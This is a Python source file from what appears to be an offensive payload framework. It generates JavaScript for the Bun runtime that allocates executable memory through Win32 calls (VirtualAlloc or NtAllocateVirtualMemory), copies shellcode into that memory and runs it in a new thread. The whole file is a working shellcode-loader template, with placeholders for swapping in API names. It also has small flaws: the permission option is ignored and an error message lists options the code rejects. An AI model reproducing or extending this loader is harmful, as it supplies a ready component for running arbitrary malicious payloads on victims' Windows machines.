class shellcoderunner:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'

        self.allocation = 'VirtualAlloc'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAlloc', 'NtAllocateVirtualMemory']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                exit(0)

        self.execution = 'CreateThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateThread or NtCreateThreadEx')
                exit(0)

    def imports(self) -> list[str]:
        return ['import Kernel32 from "@bun-win32/kernel32";', 
                'import { toArrayBuffer, ptr } from "bun:ffi";',
                'import { MemoryAllocationType, MemoryProtection, ThreadAccessRights } from "@bun-win32/kernel32";']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = """
    {transformers}
"""

        if self.allocation == 'VirtualAlloc':
            template += """
    const address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
"""
        elif self.allocation == 'NtAllocateVirtualMemory':
            template += """
    const regionSize = new BigUint64Array(1);
    const baseAddress = new BigUint64Array(1);
    regionSize[0] = {shellcodeSize}n;
    const status = {NtAllocateVirtualMemory}(-1n, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
    const address = baseAddress[0];
"""

        template += """
    const buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
    buffer.set(shellcode);
"""

        if self.execution == 'CreateThread':
            template += """
    const hThread = {CreateThread}(null, 0n, address, null, 0, null);
"""
        elif self.execution == 'NtCreateThreadEx':
            template += """
    const hThreadBuffer = new BigUint64Array(1); 
    {NtCreateThreadEx}(BigInt(ptr(hThreadBuffer)), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, null, 0, 0n, 0n, 0n, null);
    hThread = hThreadBuffer[0];
"""

        template += """
    {WaitForSingleObject}(hThread, 0xFFFFFFFF);
"""

        return template